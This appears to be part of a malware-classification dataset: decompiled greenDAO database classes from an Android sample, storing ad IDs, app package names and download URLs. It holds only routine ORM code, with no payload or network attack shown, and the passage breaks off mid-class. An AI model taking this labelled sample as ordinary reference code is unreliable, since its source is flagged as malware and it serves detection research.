"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DevOpenHelper.code","public class DevOpenHelper extends OpenHelper {   public DevOpenHelper(  Context context,  String str,  SQLiteDatabase.CursorFactory cursorFactory){     super(context,str,cursorFactory);   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){     Log.i(""greenDAO"",""Upgrading schema from version "" + i + "" to ""+ i2+ "" by dropping all tables"");     DaoMaster.dropAllTables(sQLiteDatabase,true);     onCreate(sQLiteDatabase);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DownloadFragmentInfo.code","public class DownloadFragmentInfo {   private Integer downloadTaskId;   private Long finishSize;   private Integer fragmentId;   private Boolean isRunning;   private Long threadId;   private Long totalSize;   private Long updateTime;   public DownloadFragmentInfo(){   }   public DownloadFragmentInfo(  Integer num,  Integer num2,  Long l,  Long l2,  Long l3,  Long l4,  Boolean bool){     this.downloadTaskId=num;     this.fragmentId=num2;     this.finishSize=l;     this.totalSize=l2;     this.updateTime=l3;     this.threadId=l4;     this.isRunning=bool;   }   public Integer getDownloadTaskId(){     return this.downloadTaskId;   }   public Long getFinishSize(){     return this.finishSize;   }   public Integer getFragmentId(){     return this.fragmentId;   }   public Boolean getIsRunning(){     return this.isRunning;   }   public Long getThreadId(){     return this.threadId;   }   public Long getTotalSize(){     return this.totalSize;   }   public Long getUpdateTime(){     return this.updateTime;   }   public void setDownloadTaskId(  Integer num){     this.downloadTaskId=num;   }   public void setFinishSize(  Long l){     this.finishSize=l;   }   public void setFragmentId(  Integer num){     this.fragmentId=num;   }   public void setIsRunning(  Boolean bool){     this.isRunning=bool;   }   public void setThreadId(  Long l){     this.threadId=l;   }   public void setTotalSize(  Long l){     this.totalSize=l;   }   public void setUpdateTime(  Long l){     this.updateTime=l;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DownloadFragmentInfoDao.code","public class DownloadFragmentInfoDao extends AbstractDao<DownloadFragmentInfo,Void> {   public static final String TABLENAME=""DOWNLOAD_FRAGMENT_INFO""; public class Properties {     public static final Property DownloadTaskId=new Property(0,Integer.class,""downloadTaskId"",false,""DOWNLOAD_TASK_ID"");     public static final Property FragmentId=new Property(1,Integer.class,""fragmentId"",false,""FRAGMENT_ID"");     public static final Property FinishSize=new Property(2,Long.class,""finishSize"",false,""FINISH_SIZE"");     public static final Property TotalSize=new Property(3,Long.class,""totalSize"",false,""TOTAL_SIZE"");     public static final Property UpdateTime=new Property(4,Long.class,""updateTime"",false,""UPDATE_TIME"");     public static final Property ThreadId=new Property(5,Long.class,""threadId"",false,""THREAD_ID"");     public static final Property IsRunning=new Property(6,Boolean.class,""isRunning"",false,""IS_RUNNING"");   }   public DownloadFragmentInfoDao(  DaoConfig daoConfig){     super(daoConfig);   }   public DownloadFragmentInfoDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     String str=z ? ""IF NOT EXISTS "" : """";     sQLiteDatabase.execSQL(""CREATE TABLE "" + str + ""'DOWNLOAD_FRAGMENT_INFO' ('DOWNLOAD_TASK_ID' INTEGER,'FRAGMENT_ID' INTEGER,'FINISH_SIZE' INTEGER,'TOTAL_SIZE' INTEGER,'UPDATE_TIME' INTEGER,'THREAD_ID' INTEGER,'IS_RUNNING' INTEGER);"");     sQLiteDatabase.execSQL(""CREATE UNIQUE INDEX "" + str + ""IDX_DOWNLOAD_FRAGMENT_INFO_DOWNLOAD_TASK_ID_FRAGMENT_ID ON DOWNLOAD_FRAGMENT_INFO (DOWNLOAD_TASK_ID,FRAGMENT_ID);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'DOWNLOAD_FRAGMENT_INFO'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  DownloadFragmentInfo downloadFragmentInfo){     sQLiteStatement.clearBindings();     if (downloadFragmentInfo.getDownloadTaskId() != null) {       sQLiteStatement.bindLong(1,r0.intValue());     }     if (downloadFragmentInfo.getFragmentId() != null) {       sQLiteStatement.bindLong(2,r0.intValue());     }     Long finishSize=downloadFragmentInfo.getFinishSize();     if (finishSize != null) {       sQLiteStatement.bindLong(3,finishSize.longValue());     }     Long totalSize=downloadFragmentInfo.getTotalSize();     if (totalSize != null) {       sQLiteStatement.bindLong(4,totalSize.longValue());     }     Long updateTime=downloadFragmentInfo.getUpdateTime();     if (updateTime != null) {       sQLiteStatement.bindLong(5,updateTime.longValue());     }     Long threadId=downloadFragmentInfo.getThreadId();     if (threadId != null) {       sQLiteStatement.bindLong(6,threadId.longValue());     }     Boolean isRunning=downloadFragmentInfo.getIsRunning();     if (isRunning != null) {       sQLiteStatement.bindLong(7,isRunning.booleanValue() ? 1L : 0L);     }   }   @Override public Void getKey(  DownloadFragmentInfo downloadFragmentInfo){     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public DownloadFragmentInfo readEntity(  Cursor cursor,  int i){     Boolean bool=null;     Integer valueOf=cursor.isNull(i + 0) ? null : Integer.valueOf(cursor.getInt(i + 0));     Integer valueOf2=cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1));     Long valueOf3=cursor.isNull(i + 2) ? null : Long.valueOf(cursor.getLong(i + 2));     Long valueOf4=cursor.isNull(i + 3) ? null : Long.valueOf(cursor.getLong(i + 3));     Long valueOf5=cursor.isNull(i + 4) ? null : Long.valueOf(cursor.getLong(i + 4));     Long valueOf6=cursor.isNull(i + 5) ? null : Long.valueOf(cursor.getLong(i + 5));     if (!cursor.isNull(i + 6)) {       bool=Boolean.valueOf(cursor.getShort(i + 6) != 0);     }     return new DownloadFragmentInfo(valueOf,valueOf2,valueOf3,valueOf4,valueOf5,valueOf6,bool);   }   @Override public void readEntity(  Cursor cursor,  DownloadFragmentInfo downloadFragmentInfo,  int i){     Boolean bool=null;     downloadFragmentInfo.setDownloadTaskId(cursor.isNull(i + 0) ? null : Integer.valueOf(cursor.getInt(i + 0)));     downloadFragmentInfo.setFragmentId(cursor.isNull(i + 1) ? null : Integer.valueOf(cursor.getInt(i + 1)));     downloadFragmentInfo.setFinishSize(cursor.isNull(i + 2) ? null : Long.valueOf(cursor.getLong(i + 2)));     downloadFragmentInfo.setTotalSize(cursor.isNull(i + 3) ? null : Long.valueOf(cursor.getLong(i + 3)));     downloadFragmentInfo.setUpdateTime(cursor.isNull(i + 4) ? null : Long.valueOf(cursor.getLong(i + 4)));     downloadFragmentInfo.setThreadId(cursor.isNull(i + 5) ? null : Long.valueOf(cursor.getLong(i + 5)));     if (!cursor.isNull(i + 6)) {       bool=Boolean.valueOf(cursor.getShort(i + 6) != 0);     }     downloadFragmentInfo.setIsRunning(bool);   }   @Override public Void readKey(  Cursor cursor,  int i){     return null;   }   @Override public Void updateKeyAfterInsert(  DownloadFragmentInfo downloadFragmentInfo,  long j){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DownloadInfo.code","public class DownloadInfo {   private Integer adId;   private Integer adType;   private String appName;   private String appSize;   private Long completeTime;   private Integer downloadType;   private String g2Switches;   private String g3Switches;   private String icon;   private Boolean isHW;   private Boolean isInstalled;   private String packageName;   private String recommend;   private String url;   private String wifiSwitches;   public DownloadInfo(){   }   public DownloadInfo(  Long l,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  Boolean bool,  String str7,  String str8,  String str9,  Integer num,  Boolean bool2,  Integer num2,  Integer num3){     this.completeTime=l;     this.appSize=str;     this.packageName=str2;     this.appName=str3;     this.g2Switches=str4;     this.g3Switches=str5;     this.wifiSwitches=str6;     this.isInstalled=bool;     this.icon=str7;     this.recommend=str8;     this.url=str9;     this.downloadType=num;     this.isHW=bool2;     this.adId=num2;     this.adType=num3;   }   public Integer getAdId(){     return this.adId;   }   public Integer getAdType(){     return this.adType;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public Long getCompleteTime(){     return this.completeTime;   }   public Integer getDownloadType(){     return this.downloadType;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public Boolean getIsHW(){     return this.isHW;   }   public Boolean getIsInstalled(){     return this.isInstalled;   }   public String getPackageName(){     return this.packageName;   }   public String getRecommend(){     return this.recommend;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAdType(  Integer num){     this.adType=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setCompleteTime(  Long l){     this.completeTime=l;   }   public void setDownloadType(  Integer num){     this.downloadType=num;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setIsHW(  Boolean bool){     this.isHW=bool;   }   public void setIsInstalled(  Boolean bool){     this.isInstalled=bool;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DownloadInfoDao.code","public class DownloadInfoDao extends AbstractDao<DownloadInfo,Void> {   public static final String TABLENAME=""DOWNLOAD_INFO""; public class Properties {     public static final Property CompleteTime=new Property(0,Long.class,""completeTime"",false,""COMPLETE_TIME"");     public static final Property AppSize=new Property(1,String.class,""appSize"",false,""APP_SIZE"");     public static final Property PackageName=new Property(2,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(3,String.class,""appName"",false,""APP_NAME"");     public static final Property G2Switches=new Property(4,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(5,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(6,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property IsInstalled=new Property(7,Boolean.class,""isInstalled"",false,""IS_INSTALLED"");     public static final Property Icon=new Property(8,String.class,""icon"",false,""ICON"");     public static final Property Recommend=new Property(9,String.class,""recommend"",false,""RECOMMEND"");     public static final Property Url=new Property(10,String.class,""url"",false,""URL"");     public static final Property DownloadType=new Property(11,Integer.class,""downloadType"",false,""DOWNLOAD_TYPE"");     public static final Property IsHW=new Property(12,Boolean.class,""isHW"",false,""IS_HW"");     public static final Property AdId=new Property(13,Integer.class,""adId"",false,""AD_ID"");     public static final Property AdType=new Property(14,Integer.class,""adType"",false,""AD_TYPE"");   }   public DownloadInfoDao(  DaoConfig daoConfig){     super(daoConfig);   }   public DownloadInfoDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     String str=z ? ""IF NOT EXISTS "" : """";     sQLiteDatabase.execSQL(""CREATE TABLE "" + str + ""'DOWNLOAD_INFO' ('COMPLETE_TIME' INTEGER,'APP_SIZE' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'IS_INSTALLED' INTEGER,'ICON' TEXT,'RECOMMEND' TEXT,'URL' TEXT,'DOWNLOAD_TYPE' INTEGER,'IS_HW' INTEGER,'AD_ID' INTEGER,'AD_TYPE' INTEGER);"");     sQLiteDatabase.execSQL(""CREATE UNIQUE INDEX "" + str + ""IDX_DOWNLOAD_INFO_AD_ID_AD_TYPE ON DOWNLOAD_INFO (AD_ID,AD_TYPE);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'DOWNLOAD_INFO'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  DownloadInfo downloadInfo){     sQLiteStatement.clearBindings();     Long completeTime=downloadInfo.getCompleteTime();     if (completeTime != null) {       sQLiteStatement.bindLong(1,completeTime.longValue());     }     String appSize=downloadInfo.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(2,appSize);     }     String packageName=downloadInfo.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(3,packageName);     }     String appName=downloadInfo.getAppName();     if (appName != null) {       sQLiteStatement.bindString(4,appName);     }     String g2Switches=downloadInfo.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(5,g2Switches);     }     String g3Switches=downloadInfo.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(6,g3Switches);     }     String wifiSwitches=downloadInfo.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(7,wifiSwitches);     }     Boolean isInstalled=downloadInfo.getIsInstalled();     if (isInstalled != null) {       sQLiteStatement.bindLong(8,isInstalled.booleanValue() ? 1L : 0L);     }     String icon=downloadInfo.getIcon();     if (icon != null) {       sQLiteStatement.bindString(9,icon);     }     String recommend=downloadInfo.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(10,recommend);     }     String url=downloadInfo.getUrl();     if (url != null) {       sQLiteStatement.bindString(11,url);     }     if (downloadInfo.getDownloadType() != null) {       sQLiteStatement.bindLong(12,r0.intValue());     }     Boolean isHW=downloadInfo.getIsHW();     if (isHW != null) {       sQLiteStatement.bindLong(13,isHW.booleanValue() ? 1L : 0L);     }     if (downloadInfo.getAdId() != null) {       sQLiteStatement.bindLong(14,r0.intValue());     }     if (downloadInfo.getAdType() != null) {       sQLiteStatement.bindLong(15,r0.intValue());     }   }   @Override public Void getKey(  DownloadInfo downloadInfo){     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public DownloadInfo readEntity(  Cursor cursor,  int i){     Boolean valueOf;     Boolean valueOf2;     Long valueOf3=cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0));     String string=cursor.isNull(i + 1) ? null : cursor.getString(i + 1);     String string2=cursor.isNull(i + 2) ? null : cursor.getString(i + 2);     String string3=cursor.isNull(i + 3) ? null : cursor.getString(i + 3);     String string4=cursor.isNull(i + 4) ? null : cursor.getString(i + 4);     String string5=cursor.isNull(i + 5) ? null : cursor.getString(i + 5);     String string6=cursor.isNull(i + 6) ? null : cursor.getString(i + 6);     if (cursor.isNull(i + 7)) {       valueOf=null;     }  else {       valueOf=Boolean.valueOf(cursor.getShort(i + 7) != 0);     }     String string7=cursor.isNull(i + 8) ? null : cursor.getString(i + 8);     String string8=cursor.isNull(i + 9) ? null : cursor.getString(i + 9);     String string9=cursor.isNull(i + 10) ? null : cursor.getString(i + 10);     Integer valueOf4=cursor.isNull(i + 11) ? null : Integer.valueOf(cursor.getInt(i + 11));     if (cursor.isNull(i + 12)) {       valueOf2=null;     }  else {       valueOf2=Boolean.valueOf(cursor.getShort(i + 12) != 0);     }     return new DownloadInfo(valueOf3,string,string2,string3,string4,string5,string6,valueOf,string7,string8,string9,valueOf4,valueOf2,cursor.isNull(i + 13) ? null : Integer.valueOf(cursor.getInt(i + 13)),cursor.isNull(i + 14) ? null : Integer.valueOf(cursor.getInt(i + 14)));   }   @Override public void readEntity(  Cursor cursor,  DownloadInfo downloadInfo,  int i){     Boolean valueOf;     Boolean valueOf2;     downloadInfo.setCompleteTime(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     downloadInfo.setAppSize(cursor.isNull(i + 1) ? null : cursor.getString(i + 1));     downloadInfo.setPackageName(cursor.isNull(i + 2) ? null : cursor.getString(i + 2));     downloadInfo.setAppName(cursor.isNull(i + 3) ? null : cursor.getString(i + 3));     downloadInfo.setG2Switches(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     downloadInfo.setG3Switches(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     downloadInfo.setWifiSwitches(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     if (cursor.isNull(i + 7)) {       valueOf=null;     }  else {       valueOf=Boolean.valueOf(cursor.getShort(i + 7) != 0);     }     downloadInfo.setIsInstalled(valueOf);     downloadInfo.setIcon(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     downloadInfo.setRecommend(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     downloadInfo.setUrl(cursor.isNull(i + 10) ? null : cursor.getString(i + 10));     downloadInfo.setDownloadType(cursor.isNull(i + 11) ? null : Integer.valueOf(cursor.getInt(i + 11)));     if (cursor.isNull(i + 12)) {       valueOf2=null;     }  else {       valueOf2=Boolean.valueOf(cursor.getShort(i + 12) != 0);     }     downloadInfo.setIsHW(valueOf2);     downloadInfo.setAdId(cursor.isNull(i + 13) ? null : Integer.valueOf(cursor.getInt(i + 13)));     downloadInfo.setAdType(cursor.isNull(i + 14) ? null : Integer.valueOf(cursor.getInt(i + 14)));   }   @Override public Void readKey(  Cursor cursor,  int i){     return null;   }   @Override public Void updateKeyAfterInsert(  DownloadInfo downloadInfo,  long j){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DownloadSuccessInfo.code","public class DownloadSuccessInfo {   private Integer adId;   private Integer adType;   private String appName;   private String appSize;   private Long completeTime;   private Integer downloadType;   private String g2Switches;   private String g3Switches;   private String icon;   private String packageName;   private String recommend;   private String url;   private String wifiSwitches;   public DownloadSuccessInfo(){   }   public DownloadSuccessInfo(  Long l,  String str,  String str2,  String str3,  String str4,  String str5,  String str6,  String str7,  String str8,  String str9,  Integer num,  Integer num2,  Integer num3){     this.completeTime=l;     this.appSize=str;     this.packageName=str2;     this.appName=str3;     this.g2Switches=str4;     this.g3Switches=str5;     this.wifiSwitches=str6;     this.icon=str7;     this.recommend=str8;     this.url=str9;     this.downloadType=num;     this.adId=num2;     this.adType=num3;   }   public Integer getAdId(){     return this.adId;   }   public Integer getAdType(){     return this.adType;   }   public String getAppName(){     return this.appName;   }   public String getAppSize(){     return this.appSize;   }   public Long getCompleteTime(){     return this.completeTime;   }   public Integer getDownloadType(){     return this.downloadType;   }   public String getG2Switches(){     return this.g2Switches;   }   public String getG3Switches(){     return this.g3Switches;   }   public String getIcon(){     return this.icon;   }   public String getPackageName(){     return this.packageName;   }   public String getRecommend(){     return this.recommend;   }   public String getUrl(){     return this.url;   }   public String getWifiSwitches(){     return this.wifiSwitches;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAdType(  Integer num){     this.adType=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setAppSize(  String str){     this.appSize=str;   }   public void setCompleteTime(  Long l){     this.completeTime=l;   }   public void setDownloadType(  Integer num){     this.downloadType=num;   }   public void setG2Switches(  String str){     this.g2Switches=str;   }   public void setG3Switches(  String str){     this.g3Switches=str;   }   public void setIcon(  String str){     this.icon=str;   }   public void setPackageName(  String str){     this.packageName=str;   }   public void setRecommend(  String str){     this.recommend=str;   }   public void setUrl(  String str){     this.url=str;   }   public void setWifiSwitches(  String str){     this.wifiSwitches=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\DownloadSuccessInfoDao.code","public class DownloadSuccessInfoDao extends AbstractDao<DownloadSuccessInfo,Void> {   public static final String TABLENAME=""DOWNLOAD_SUCCESS_INFO""; public class Properties {     public static final Property CompleteTime=new Property(0,Long.class,""completeTime"",false,""COMPLETE_TIME"");     public static final Property AppSize=new Property(1,String.class,""appSize"",false,""APP_SIZE"");     public static final Property PackageName=new Property(2,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(3,String.class,""appName"",false,""APP_NAME"");     public static final Property G2Switches=new Property(4,String.class,""g2Switches"",false,""G2_SWITCHES"");     public static final Property G3Switches=new Property(5,String.class,""g3Switches"",false,""G3_SWITCHES"");     public static final Property WifiSwitches=new Property(6,String.class,""wifiSwitches"",false,""WIFI_SWITCHES"");     public static final Property Icon=new Property(7,String.class,""icon"",false,""ICON"");     public static final Property Recommend=new Property(8,String.class,""recommend"",false,""RECOMMEND"");     public static final Property Url=new Property(9,String.class,""url"",false,""URL"");     public static final Property DownloadType=new Property(10,Integer.class,""downloadType"",false,""DOWNLOAD_TYPE"");     public static final Property AdId=new Property(11,Integer.class,""adId"",false,""AD_ID"");     public static final Property AdType=new Property(12,Integer.class,""adType"",false,""AD_TYPE"");   }   public DownloadSuccessInfoDao(  DaoConfig daoConfig){     super(daoConfig);   }   public DownloadSuccessInfoDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     String str=z ? ""IF NOT EXISTS "" : """";     sQLiteDatabase.execSQL(""CREATE TABLE "" + str + ""'DOWNLOAD_SUCCESS_INFO' ('COMPLETE_TIME' INTEGER,'APP_SIZE' TEXT,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'G2_SWITCHES' TEXT,'G3_SWITCHES' TEXT,'WIFI_SWITCHES' TEXT,'ICON' TEXT,'RECOMMEND' TEXT,'URL' TEXT,'DOWNLOAD_TYPE' INTEGER,'AD_ID' INTEGER,'AD_TYPE' INTEGER);"");     sQLiteDatabase.execSQL(""CREATE UNIQUE INDEX "" + str + ""IDX_DOWNLOAD_SUCCESS_INFO_AD_ID_AD_TYPE ON DOWNLOAD_SUCCESS_INFO (AD_ID,AD_TYPE);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'DOWNLOAD_SUCCESS_INFO'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  DownloadSuccessInfo downloadSuccessInfo){     sQLiteStatement.clearBindings();     Long completeTime=downloadSuccessInfo.getCompleteTime();     if (completeTime != null) {       sQLiteStatement.bindLong(1,completeTime.longValue());     }     String appSize=downloadSuccessInfo.getAppSize();     if (appSize != null) {       sQLiteStatement.bindString(2,appSize);     }     String packageName=downloadSuccessInfo.getPackageName();     if (packageName != null) {       sQLiteStatement.bindString(3,packageName);     }     String appName=downloadSuccessInfo.getAppName();     if (appName != null) {       sQLiteStatement.bindString(4,appName);     }     String g2Switches=downloadSuccessInfo.getG2Switches();     if (g2Switches != null) {       sQLiteStatement.bindString(5,g2Switches);     }     String g3Switches=downloadSuccessInfo.getG3Switches();     if (g3Switches != null) {       sQLiteStatement.bindString(6,g3Switches);     }     String wifiSwitches=downloadSuccessInfo.getWifiSwitches();     if (wifiSwitches != null) {       sQLiteStatement.bindString(7,wifiSwitches);     }     String icon=downloadSuccessInfo.getIcon();     if (icon != null) {       sQLiteStatement.bindString(8,icon);     }     String recommend=downloadSuccessInfo.getRecommend();     if (recommend != null) {       sQLiteStatement.bindString(9,recommend);     }     String url=downloadSuccessInfo.getUrl();     if (url != null) {       sQLiteStatement.bindString(10,url);     }     if (downloadSuccessInfo.getDownloadType() != null) {       sQLiteStatement.bindLong(11,r0.intValue());     }     if (downloadSuccessInfo.getAdId() != null) {       sQLiteStatement.bindLong(12,r0.intValue());     }     if (downloadSuccessInfo.getAdType() != null) {       sQLiteStatement.bindLong(13,r0.intValue());     }   }   @Override public Void getKey(  DownloadSuccessInfo downloadSuccessInfo){     return null;   }   @Override public boolean isEntityUpdateable(){     return true;   }   @Override public DownloadSuccessInfo readEntity(  Cursor cursor,  int i){     return new DownloadSuccessInfo(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)),cursor.isNull(i + 1) ? null : cursor.getString(i + 1),cursor.isNull(i + 2) ? null : cursor.getString(i + 2),cursor.isNull(i + 3) ? null : cursor.getString(i + 3),cursor.isNull(i + 4) ? null : cursor.getString(i + 4),cursor.isNull(i + 5) ? null : cursor.getString(i + 5),cursor.isNull(i + 6) ? null : cursor.getString(i + 6),cursor.isNull(i + 7) ? null : cursor.getString(i + 7),cursor.isNull(i + 8) ? null : cursor.getString(i + 8),cursor.isNull(i + 9) ? null : cursor.getString(i + 9),cursor.isNull(i + 10) ? null : Integer.valueOf(cursor.getInt(i + 10)),cursor.isNull(i + 11) ? null : Integer.valueOf(cursor.getInt(i + 11)),cursor.isNull(i + 12) ? null : Integer.valueOf(cursor.getInt(i + 12)));   }   @Override public void readEntity(  Cursor cursor,  DownloadSuccessInfo downloadSuccessInfo,  int i){     downloadSuccessInfo.setCompleteTime(cursor.isNull(i + 0) ? null : Long.valueOf(cursor.getLong(i + 0)));     downloadSuccessInfo.setAppSize(cursor.isNull(i + 1) ? null : cursor.getString(i + 1));     downloadSuccessInfo.setPackageName(cursor.isNull(i + 2) ? null : cursor.getString(i + 2));     downloadSuccessInfo.setAppName(cursor.isNull(i + 3) ? null : cursor.getString(i + 3));     downloadSuccessInfo.setG2Switches(cursor.isNull(i + 4) ? null : cursor.getString(i + 4));     downloadSuccessInfo.setG3Switches(cursor.isNull(i + 5) ? null : cursor.getString(i + 5));     downloadSuccessInfo.setWifiSwitches(cursor.isNull(i + 6) ? null : cursor.getString(i + 6));     downloadSuccessInfo.setIcon(cursor.isNull(i + 7) ? null : cursor.getString(i + 7));     downloadSuccessInfo.setRecommend(cursor.isNull(i + 8) ? null : cursor.getString(i + 8));     downloadSuccessInfo.setUrl(cursor.isNull(i + 9) ? null : cursor.getString(i + 9));     downloadSuccessInfo.setDownloadType(cursor.isNull(i + 10) ? null : Integer.valueOf(cursor.getInt(i + 10)));     downloadSuccessInfo.setAdId(cursor.isNull(i + 11) ? null : Integer.valueOf(cursor.getInt(i + 11)));     downloadSuccessInfo.setAdType(cursor.isNull(i + 12) ? null : Integer.valueOf(cursor.getInt(i + 12)));   }   @Override public Void readKey(  Cursor cursor,  int i){     return null;   }   @Override public Void updateKeyAfterInsert(  DownloadSuccessInfo downloadSuccessInfo,  long j){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\FailureActionInfo.code","public class FailureActionInfo {   private Integer action;   private Integer adId;   private Integer adType;   private String appName;   private Integer count;   private String date;   private String packageName;   public FailureActionInfo(){   }   public FailureActionInfo(  Integer num,  Integer num2,  Integer num3,  Integer num4,  String str,  String str2,  String str3){     this.adType=num;     this.adId=num2;     this.action=num3;     this.count=num4;     this.packageName=str;     this.appName=str2;     this.date=str3;   }   public Integer getAction(){     return this.action;   }   public Integer getAdId(){     return this.adId;   }   public Integer getAdType(){     return this.adType;   }   public String getAppName(){     return this.appName;   }   public Integer getCount(){     return this.count;   }   public String getDate(){     return this.date;   }   public String getPackageName(){     return this.packageName;   }   public void setAction(  Integer num){     this.action=num;   }   public void setAdId(  Integer num){     this.adId=num;   }   public void setAdType(  Integer num){     this.adType=num;   }   public void setAppName(  String str){     this.appName=str;   }   public void setCount(  Integer num){     this.count=num;   }   public void setDate(  String str){     this.date=str;   }   public void setPackageName(  String str){     this.packageName=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.db.dao\FailureActionInfoDao.code","public class FailureActionInfoDao extends AbstractDao<FailureActionInfo,Void> {   public static final String TABLENAME=""FAILURE_ACTION_INFO""; public class Properties {     public static final Property AdType=new Property(0,Integer.class,""adType"",false,""AD_TYPE"");     public static final Property AdId=new Property(1,Integer.class,""adId"",false,""AD_ID"");     public static final Property Action=new Property(2,Integer.class,""action"",false,""ACTION"");     public static final Property Count=new Property(3,Integer.class,""count"",false,""COUNT"");     public static final Property PackageName=new Property(4,String.class,""packageName"",false,""PACKAGE_NAME"");     public static final Property AppName=new Property(5,String.class,""appName"",false,""APP_NAME"");     public static final Property Date=new Property(6,String.class,""date"",false,""DATE"");   }   public FailureActionInfoDao(  DaoConfig daoConfig){     super(daoConfig);   }   public FailureActionInfoDao(  DaoConfig daoConfig,  DaoSession daoSession){     super(daoConfig,daoSession);   }   public static void createTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     String str=z ? ""IF NOT EXISTS "" : """";     sQLiteDatabase.execSQL(""CREATE TABLE "" + str + ""'FAILURE_ACTION_INFO' ('AD_TYPE' INTEGER,'AD_ID' INTEGER,'ACTION' INTEGER,'COUNT' INTEGER,'PACKAGE_NAME' TEXT,'APP_NAME' TEXT,'DATE' TEXT);"");     sQLiteDatabase.execSQL(""CREATE UNIQUE INDEX "" + str + ""IDX_FAILURE_ACTION_INFO_AD_TYPE_AD_ID_ACTION ON FAILURE_ACTION_INFO (AD_TYPE,AD_ID,ACTION);"");   }   public static void dropTable(  SQLiteDatabase sQLiteDatabase,  boolean z){     sQLiteDatabase.execSQL(""DROP TABLE "" + (z ? ""IF EXISTS "" : """") + ""'FAILURE_ACTION_INFO'"");   }   @Override public void bindValues(  SQLiteStatement sQLiteStatement,  FailureActionInfo failureActionInfo){     sQLiteStatement.clearBindings();     if (failureActionInfo.getAdType() != null) {       sQLiteStatement.bindLong(1,r0.intValue());     }     if (failureActionInfo.getAdId() != null) {       sQLiteStatement.bindLong(2,r0.intValue());     }     if 